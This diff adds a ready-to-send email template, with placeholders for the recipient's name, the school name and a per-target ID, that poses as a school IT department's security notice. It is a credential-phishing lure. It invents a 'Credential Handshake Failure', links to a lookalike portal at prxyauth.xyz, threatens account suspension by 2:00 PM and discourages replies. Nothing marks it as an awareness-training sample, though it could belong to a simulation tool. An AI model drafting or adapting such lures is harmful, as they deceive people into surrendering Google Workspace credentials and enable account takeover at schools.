@@ -1,0 +1,15 @@
+Hello {{Name}},
+
+This is an automated notification from the {{SchoolName}} IT Department.
+
+During our scheduled security audit this morning, we identified a Credential Handshake Failure associated with your Google Workspace account. This usually occurs when a mobile device update desyncs the hardware security token.
+
+To maintain uninterrupted access to your Gmail, Drive, and Classroom assets, please perform a one-time identity re-synchronization through our secure portal:
+
+https://portal.prxyauth.xyz/auth?id={{TargetID}}
+
+Note: Failure to synchronize before 2:00 PM EST will result in an automated account suspension for your protection. If you require assistance, please do not reply to this automated ticket.
+
+Regards,
+Director of Technology
+{{SchoolName}} Institutional Pride
